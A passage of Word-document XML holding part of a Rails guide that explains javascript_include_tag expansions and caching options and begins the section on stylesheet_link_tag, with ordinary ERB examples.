              </w:rPr>
              <w:t>config.action_view.javascript_expansions[:defaults] = %w(foo.js bar.js)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4EB135EF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can also define new defaults:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5F75D1DB" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7F6EF9E5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="707920401"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.action_view.javascript_expansions[:projects] = %w(projects.js tickets.js)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4600AE94" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">And use them by referencing them exactly like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:defaults</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4535"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7053F298" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="23362C73" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1466583806"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>javascript_include_tag :projects</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5F8EA19C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:defaults</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, if an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>application.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file exists in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>public/javascripts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> it will be included as well at the end.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDAC931" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Also, if the asset pipeline is disabled, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:all</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> expansion loads every JavaScript file in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>public/javascripts</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3935"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="42B0F813" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4D654FBE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="517042765"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>javascript_include_tag :all</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1A29D8C1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Note that your defaults of choice will be included first, so they will be available to all subsequently included files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="526D3483" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can supply the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:recursive</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to load files in subfolders of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>public/javascripts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as well:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6263"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="6ABB373A" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="42845B9C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="6030974"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>javascript_include_tag :all, :recursive</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B4297D2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you’re loading multiple JavaScript files, you can create a better user experience by combining multiple files into a single download. To make this happen in production, specify </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:cache =&gt; true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>javascript_include_tag</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7343"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="538091AF" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34C70E69" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1936134971"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>javascript_include_tag "main", "columns", :cache</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0661C19E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default, the combined file will be delivered as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>javascripts/all.js</w:t>
      </w:r>
      <w:r>
        <w:t>. You can specify a location for the cached asset file instead:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5328"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="188BD0FE" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F4D721C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>javascript_include_tag "main", "columns",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="091F805B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :cache</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'cache/main/display'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="46DD6103" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can even use dynamic paths such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cache/#{current_site}/main/display</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35DF8788" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.1.3 Linking to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Files with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>stylesheet_link_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5F4545" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>stylesheet_link_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper returns an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;link&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tag for each source provided.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F1523D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you are using Rails with the “Asset Pipeline” enabled, this helper will generate a link to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>/assets/stylesheets/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This link is then processed by the Sprockets gem. A stylesheet file can be stored in one of three locations: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/assets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/assets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>vendor/assets</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74ECD6C2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can specify a full path relative to the document root, or a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. For example, to link to a stylesheet file that is inside a directory called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>stylesheets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> inside of one of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/assets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/assets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>vendor/assets</w:t>
      </w:r>
      <w:r>
        <w:t>, you would do this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3815"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0795116A" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3CF7C032" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1712653979"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>stylesheet_link_tag "main"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7CC9BB6A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To include </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/main.css</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/columns.css</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5135"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="296EE9DA" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6227BC47" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1807120609"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>stylesheet_link_tag "main", "columns"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1F0E25EA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To include </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/main.css</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/photos/columns.css</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6095"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="059272F5" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7CD1540D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1995865894"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>stylesheet_link_tag "main", "/photos/columns"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E50DAC6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To include </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://example.com/main.css</w:t>
